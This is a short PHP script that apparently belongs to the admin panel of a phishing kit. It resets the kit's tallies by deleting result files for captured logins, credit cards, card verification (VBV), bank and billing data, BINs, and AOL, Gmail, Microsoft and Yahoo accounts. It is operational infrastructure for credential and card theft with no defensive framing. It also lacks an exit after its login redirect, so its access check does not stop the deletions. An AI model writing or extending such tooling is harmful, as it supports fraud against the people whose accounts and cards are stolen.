<?php
error_reporting(0);
session_start();
if(!isset($_SESSION['email_admin'])) {
    header("location: login.php");
}
unlink("../result/total_click.txt");
unlink("../result/total_login.txt");
unlink("../result/total_cc.txt");
unlink("../result/total_vbv.txt");
unlink("../result/total_bank.txt");
unlink("../result/total_bot.txt");
unlink("../result/total_upload.txt");
unlink("../result/total_email.txt");
unlink("../result/total_bin.txt");
unlink("../result/total_billing.txt");
unlink("../result/log_visitor.txt");
unlink("../result/total_aol.txt");
unlink("../result/total_aol.txt");
unlink("../result/total_gmail.txt");
unlink("../result/total_microsoft.txt");
unlink("../result/total_yahoo.txt");

echo "<script type='text/javascript'>window.top.location='index.php';</script>";